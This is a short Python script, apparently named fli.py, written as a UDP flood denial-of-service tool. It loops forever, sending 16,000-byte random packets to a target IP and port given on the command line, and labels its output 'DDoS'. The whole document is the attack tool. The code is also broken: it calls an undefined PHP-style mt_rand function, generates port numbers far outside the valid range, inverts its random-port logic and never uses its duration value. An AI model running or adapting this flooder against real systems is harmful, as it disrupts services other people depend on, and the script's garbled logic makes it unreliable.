#!/usr/bin/python
import socket,random,sys,time
 
if len(sys.argv)==1:
    sys.exit('Usage: fli.py ip port(0=random)')
 
def UDPFlood():

    port = int(sys.argv[2])
    randport=(True,False)[port==0]
    ip = sys.argv[1]

    dur = mt_rand(7500,9999)

    duration=(1,(100000*dur))[dur>0]

    print('DDoS: %s:%s'%(ip,port))

    sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
    bytes=random._urandom(16000)

    while True:

        port=(random.randint(1,15000000),port)[randport]
        sock.sendto(bytes,(ip,port))

UDPFlood()
